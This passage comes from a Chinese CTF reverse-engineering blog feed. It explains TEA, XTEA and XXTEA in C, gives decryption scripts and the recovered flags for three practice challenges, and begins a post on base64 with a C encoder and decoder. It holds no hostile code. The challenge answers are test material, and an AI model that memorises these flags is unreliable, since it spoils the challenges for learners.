class="line">    <span class="keyword">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">2</span>]= &#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="keyword">const</span> k[<span class="number">4</span>]= &#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> n= <span class="number">2</span>; <span class="comment">//n的绝对值表示v的长度，取正表示加密，取负表示解密</span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    btea(v, n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    btea(v, -n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><blockquote><p>加密前原始数据：1 2<br>加密后的数据：3238569099 2059193138<br>解密后的数据：1 2</p><p>Process returned 0 (0x0)   execution time : 0.369 s<br>Press any key to continue.</p></blockquote><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h3><p><a href="https://pan.baidu.com/s/1jZogTyTC3aKMmBO9DyaEgg">附件链接</a> 提取码：0000<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/tea1.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/tea2.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/tea3.PNG"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n;j+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> v0=v[j], v1=v[j+<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">        <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">        <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++)</span><br><span class="line">        &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">            v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">            sum -= delta;</span><br><span class="line">        &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">        v[j]=v0; v[j+<span class="number">1</span>]=v1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> </span><br><span class="line">data[<span class="number">24</span>]=&#123;<span class="number">0xdd970cc4</span>,<span class="number">0x818d6166</span>,<span class="number">0xb47035f4</span>,<span class="number">0xd099de74</span>,<span class="number">0xb50c0b58</span>,<span class="number">0x2cecb013</span>,<span class="number">0x20ca556f</span>,<span class="number">0x35301e68</span>,<span class="number">0x457b62b2</span>,<span class="number">0x91926c85</span>,<span class="number">0xe15a695a</span>,<span class="number">0x2e550212</span>,<span class="number">0xdd0426e</span>,<span class="number">0x839dc37</span>,<span class="number">0xba150ea0</span>,<span class="number">0x2aad9fd7</span>,<span class="number">0x6889d7e2</span>,<span class="number">0x82f201d7</span>,<span class="number">0x3374d877</span>,<span class="number">0x2e17ed88</span>,<span class="number">0x35196e88</span>,<span class="number">0x236ab4b9</span>,<span class="number">0x75c5e88</span>,<span class="number">0xdb68bf4b</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> k[<span class="number">4</span>]=&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n=<span class="number">24</span>;</span><br><span class="line">decrypt(data, k,n);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{YOU_FIND_THE_FLAG!}</p></blockquote><h3 id="xtea"><a href="#xtea" class="headerlink" title="xtea"></a>xtea</h3><p><a href="https://pan.baidu.com/s/1bAgbw0TAJMC_5uWO_UwqIQ">附件链接</a> 提取码：0000<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xtea1.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xtea2.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xtea3.PNG"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decipher</span><span class="params">(<span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>], <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> num_rounds=<span class="number">32</span>;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n;j+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> v0=v[j], v1=v[j+<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">            sum -= delta;</span><br><span class="line">            v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        v[j]=v0; v[j+<span class="number">1</span>]=v1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> data[<span class="number">26</span>]=&#123;<span class="number">0x27275d99</span>,<span class="number">0x3c11048b</span>,<span class="number">0x467297e3</span>,<span class="number">0xc09af6b8</span>,<span class="number">0xed74946a</span>,<span class="number">0x2f994350</span>,<span class="number">0xf045f43e</span>,<span class="number">0x81b107b8</span>,<span class="number">0x899a9e3</span>,<span class="number">0x2bc3d1b6</span>,<span class="number">0x6f738cdb</span>,<span class="number">0xfd9b7c7c</span>,<span class="number">0xe52275fe</span>,<span class="number">0x21586050</span>,<span class="number">0x6bd3d095</span>,<span class="number">0xc1edbe2f</span>,<span class="number">0x6f1f00b1</span>,<span class="number">0x1613f009</span>,<span class="number">0x6109db9</span>,<span class="number">0xfef136d2</span>,<span class="number">0x98dd74f9</span>,<span class="number">0x750a3393</span>,<span class="number">0xb93cc79c</span>,<span class="number">0x35df2918</span>,<span class="number">0xba1f4f1c</span>,<span class="number">0x5936c0c8</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> k[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n=<span class="number">26</span>;</span><br><span class="line">decipher(data, k, n);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{luoyu-1224.github.io}</p></blockquote><h3 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h3><p><a href="https://pan.baidu.com/s/1Kd_G9dwbLA7vP5yolYECaA">附件链接</a> 提取码：0000<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xxtea2.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xxtea1.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xxtea3.PNG"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)^(sum^y) + (k[p&amp;3^e]^z);</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> check[<span class="number">26</span>]=&#123;<span class="number">0xecc7f567</span>,<span class="number">0xecc3d63f</span>,<span class="number">0xfd046ee</span>,<span class="number">0x4231e0b8</span>,<span class="number">0x2aa73061</span>,<span class="number">0x376a03f2</span>,<span class="number">0xef400f49</span>,<span class="number">0x78b22f96</span>,<span class="number">0x3c80565a</span>,<span class="number">0x53cf31ae</span>,<span class="number">0x1bf54a05</span>,<span class="number">0x43ac56f8</span>,<span class="number">0xeb92b3fd</span>,<span class="number">0xd4abe89b</span>,<span class="number">0xfd3b88db</span>,<span class="number">0x6c65b706</span>,<span class="number">0xbe48072b</span>,<span class="number">0x3e445861</span>,<span class="number">0x247e6144</span>,<span class="number">0x79b5a5af</span>,<span class="number">0x3e42487b</span>,<span class="number">0x2ac44245</span>,<span class="number">0x15e908f0</span>,<span class="number">0x120e8173</span>,<span class="number">0x69fea947</span>,<span class="number">0x70917ef7</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">btea</span><span class="params">(<span class="keyword">int</span>* v, <span class="keyword">int</span> n, <span class="keyword">unsigned</span> <span class="keyword">int</span> k[<span class="number">4</span>])</span>       </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> z=v[n<span class="number">-1</span>], y=v[<span class="number">0</span>], sum=<span class="number">0</span>, e, DELTA=<span class="number">0x9e3779b9</span>;</span><br><span class="line"><span class="keyword">int</span> p, q ;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 加密过程 */</span></span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        <span class="keyword">while</span> (q-- &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">    sum += DELTA;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">&#123;</span><br><span class="line">y = v[p+<span class="number">1</span>];</span><br><span class="line">z = v[p] += MX;</span><br><span class="line">&#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 解密过程 */</span></span><br><span class="line">        n = -n;</span><br><span class="line">q = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">sum = q*DELTA ;</span><br><span class="line">        <span class="keyword">while</span> (sum != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--) </span><br><span class="line">&#123;</span><br><span class="line">z = v[p<span class="number">-1</span>];</span><br><span class="line">y = v[p] -= MX;</span><br><span class="line">&#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>]; </span><br><span class="line">y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">sum -= DELTA; </span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> k[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n=<span class="number">26</span>;</span><br><span class="line">btea(check, -n, k);</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">35</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,check[i]);</span><br><span class="line">&#125;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><blockquote><p>flag{xxtea_is_interesting}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>base64在逆向中的应用</title>
      <link href="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
      <url>/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="base64的原理和C语言实现"><a href="#base64的原理和C语言实现" class="headerlink" title="base64的原理和C语言实现"></a>base64的原理和C语言实现</h1><a id="more"></a><p>原理参考此篇文章 <a href="https://blog.csdn.net/wo541075754/article/details/81734770">链接</a></p><p>C语言代码实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;math.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">char table[65]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">char padding_char&#x3D;&#39;&#x3D;&#39;;</span><br><span class="line"></span><br><span class="line">int findchr(char *array,char ch)&#123;</span><br><span class="line">    for(int i&#x3D;0;i&lt;strlen(array);i++)&#123;</span><br><span class="line">        if(array[i]&#x3D;&#x3D;ch)&#123;</span><br><span class="line">            return i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void base64_encode(char *src,char *result)&#123;</span><br><span class="line">    int fill_bit&#x3D;0;</span><br><span class="line">    int data_length;</span><br><span class="line">    int result_length;</span><br><span class="line">    int index;</span><br><span class="line">    _Bool full&#x3D;trunc;</span><br><span class="line">    data_length&#x3D;strlen(src);</span><br><span class="line">    &#x2F;&#x2F;printf(&quot;length:%d\n&quot;,data_length);</span><br><span class="line">    fill_bit&#x3D;((3-strlen(src)%3)%3); &#x2F;&#x2F;计算未满字节，注意除去3的情况</span><br><span class="line">    for(int k&#x3D;0;k&lt;fill_bit;k++)&#123;</span><br><span class="line">        src[data_length+k]&#x3D;&#39;\0&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    int j&#x3D;0;</span><br><span class="line">    for(int i&#x3D;0;i&lt;data_length;i+&#x3D;3)&#123;</span><br><span class="line">        index&#x3D;src[i]&gt;&gt;2;</span><br><span class="line">        result[j++]&#x3D;table[index];</span><br><span class="line">        index&#x3D;((src[i]&amp;3)&lt;&lt;4)+(src[i+1]&gt;&gt;4);</span><br><span class="line">        result[j++]&#x3D;table[index];</span><br><span class="line">        index&#x3D;((src[i+1]&amp;15)&lt;&lt;2)+(src[i+2]&gt;&gt;6);</span><br><span class="line">        result[j++]&#x3D;table[index];</span><br><span class="line">        index&#x3D;(src[i+2]&amp;63);</span><br><span class="line">        result[j++]&#x3D;table[index];</span><br><span class="line">        &#x2F;&#x2F;&lt;&lt; &gt;&gt; 运算符的优先级低于+ -，注意加括号</span><br><span class="line">    &#125;</span><br><span class="line">    result_length&#x3D;strlen(result);</span><br><span class="line">    for(int k&#x3D;0;k&lt;fill_bit;k++)&#123;</span><br><span class="line">        result[result_length-1-k]&#x3D;padding_char; &#x2F;&#x2F;把多余的A字符替换为&#x3D;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void base64_decode(char *src,char *result)&#123;</span><br><span class="line">    int base_len;</span><br><span class="line">    int j&#x3D;0;</span><br><span class="line">    base_len&#x3D;strlen(src);</span><br><span class="line">    &#x2F;&#x2F;printf(&quot;length:%d\n&quot;,base_len);</span><br><span class="line">    for(int i&#x3D;0;i&lt;base_len;i++)&#123;</span><br><span class="line">        if(src[i]&#x3D;&#x3D;padding_char)</span><br><span class="line">            src[i]&#x3D;&#39;A&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;printf(&quot;%s\n&quot;,src);</span><br><span class="line">    for(int i&#x3D;0;i&lt;base_len;i+&#x3D;4)&#123;</span><br><span class="line">        result[j++]&#x3D;(findchr(table,src[i])&lt;&lt;2)+(findchr(table,src[i+1])&gt;&gt;4);</span><br><span class="line">        result[j++]&#x3D;(findchr(table,src[i+1])&lt;&lt;4)+(findchr(table,src[i+2])&gt;&gt;2);</span><br><span class="line">        result[j++]&#x3D;((findchr(table,src[i+2])&amp;3)&lt;&lt;6)+(findchr(table,src[i+3]));</span><br><span class="line">        &#x2F;&#x2F;注意编码是table对应的编码，不是原来的ascii码</span><br><span class="line">        &#x2F;&#x2F;按位运算符优先级低于位移运算符，注意括号</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char words[100]&#x3D;&quot;abc&quot;;</span><br><span class="line">    char en_words[100]&#x3D;&quot;&quot;;</span><br><span class="line">    char de_words[100]&#x3D;&quot;&quot;;</span><br><span class="line">    base64_encode(words,en_words);</span><br><span class="line">    printf(&quot;encode:%s\n&quot;,en_words);</span><br><span class="line">    base64_decode(en_words,de_words);</span><br><span class="line">    printf(&quot;decode:%s\n&quot;,de_words);</span><br><span class="line">    return 0;</span><br><span class="line">    &#x2F;&#x2F;摘抄于https:&#x2F;&#x2F;eqqie.cn&#x2F;index.php&#x2F;laji_note&#x2F;785&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="base64在逆向中的应用"><a href="#base64在逆向中的应用" class="headerlink" title="base64在逆向中的应用"></a>base64在逆向中的应用</h1><h2 id="1-直接使用"><a href="#1-直接使用" class="headerlink" title="1.直接使用"></a>1.直接使用</h2><h3 id="flag为解密结果"><a href="#flag为解密结果" class="headerlink" title="flag为解密结果"></a>flag为解密结果</h3><p><a 